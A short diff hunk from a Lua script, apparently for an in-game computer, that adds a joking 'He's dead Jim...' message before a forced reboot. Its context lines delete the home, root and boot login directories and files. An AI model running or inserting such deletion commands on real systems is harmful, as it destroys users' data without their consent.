@@ -15,4 +15,7 @@ shell.execute("rm /usr/home/")
 shell.execute("rm /root/")
 shell.execute("rm /boot/99_login.lua")
 
+io.stderr:write("He's dead Jim...")
+os.sleep(0.5)
+
 computer.shutdown(true)
